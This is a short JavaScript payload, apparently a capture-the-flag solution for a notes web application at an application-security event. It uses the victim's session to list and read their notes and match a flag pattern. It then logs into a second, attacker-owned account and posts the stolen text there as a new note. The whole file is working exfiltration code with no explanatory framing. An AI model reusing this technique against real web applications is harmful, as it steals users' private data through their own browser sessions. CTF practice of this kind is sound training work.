document.addEventListener("DOMContentLoaded", execute());

async function execute() {
    console.log("ini masuk nih");
    const first_list_notes_response = await fetch('/notes/', {
        method: 'GET',
        credentials: 'same-origin'
    });
    const first_list_notes_data = await first_list_notes_response.json();
    console.log(first_list_notes_data["notes"]);

    for (var i = 0; i < first_list_notes_data["notes"].length; ++i) {
        const noteId = first_list_notes_data["notes"][i];
        console.log('checking: ' + noteId);
        const path = 'https://notes-03.appsecday2023.tvlk.tech/view/' + noteId; 
        const checking_first_note_response = await fetch(path, {
            method: 'GET'
        });
        const checking_first_note_data = await checking_first_note_response.text();
        console.log(checking_first_note_data);

        const regex = /TVLK\{[ -~]+\}/;

        const match = checking_first_note_data.match(regex);
        if (match) {
            const substring = match[0];
            console.log(substring);

            const username_second = "qwertyuiop2";
            const password_second = "qwertyuiop3";
            const second_login_response = await fetch('https://notes-03.appsecday2023.tvlk.tech/login/', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                credentials: 'include',
                body: JSON.stringify({"username": username_second, "password": password_second})
            });
            const second_login_data = await second_login_response.json();
            console.log('Login kedua berhasil!');
            console.log(second_login_data);

            const second_create_note_response = await fetch('https://notes-03.appsecday2023.tvlk.tech/create_note/', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                credentials: 'include',
                body: JSON.stringify({"note_content": "<p>" + substring + "</p>"})
            });
            const second_create_note_data = await second_create_note_response.json();
            console.log(second_create_note_data);
            console.log("Create Note selesai");
            break;
        }
    }
}
